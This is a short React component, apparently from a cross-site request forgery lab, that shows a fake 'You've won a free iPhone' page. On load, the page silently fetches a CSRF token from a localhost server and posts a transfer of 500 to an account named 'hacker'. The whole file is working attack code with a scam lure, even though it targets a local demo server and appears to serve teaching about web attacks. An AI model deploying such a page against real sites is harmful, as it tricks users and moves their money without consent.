import React, { useEffect, useState } from "react";
import axios from "axios";

import "./index.css";

function FakeAd() {
  const [csrfToken, setCsrfToken] = useState("");
  const [errorMess, setErrorMess] = useState("");

  useEffect(() => {
    axios
      .get("http://localhost:5000/csrf-token")
      .then((res) => {
        setCsrfToken(res.data.csrfToken);
      })
      .catch((error) => {
        console.error("Failed to fetch CSRF token:", error);
        setErrorMess("Failed to fetch CSRF token.");
      });
  }, []);

  useEffect(() => {
    if (csrfToken) {
      axios
        .post(
          "http://localhost:5000/transfer",
          {
            amount: 500,
            to: "hacker",
          },
          {
            headers: { "X-CSRF-Token": csrfToken },
          }
        )
        .then(() => {
          alert("You won! Check your email for details.");
        })
        .catch((error) => {
          console.error("Transfer failed:", error);
          setErrorMess("Invalid CSRF token" || "Transfer failed.");
        });
    }
  }, [csrfToken]);

  return (
    <div className="container fake-page">
      <div className="heading-container">
        <h1>🎉 Congratulations! 🎉</h1>
        <p className="subtitle">
          You've won a free iPhone! Check your email for details.
        </p>
      </div>
    </div>
  );
}

export default FakeAd;
